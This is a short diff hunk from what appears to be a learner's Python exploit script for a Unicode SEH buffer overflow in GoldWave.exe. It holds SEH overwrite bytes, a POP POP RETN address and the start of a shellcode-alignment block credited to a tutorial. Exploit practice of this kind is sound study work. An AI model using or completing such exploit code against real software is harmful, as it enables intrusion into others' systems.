@@ -10,6 +10,8 @@ from struct import pack
 nseh = "\x61\x62"
 seh = "\x0f\x6d" # Unicode POP POP RETN from GoldWave.exe 
 
+# ebx is the register closest to our shellcode following the popad 
+# maybe
 # took the venterian alignment from https://nutcrackerssecurity.github.io/Windows5.html 
 # because i'm still learning to write this manually
 venterian_alignment = (
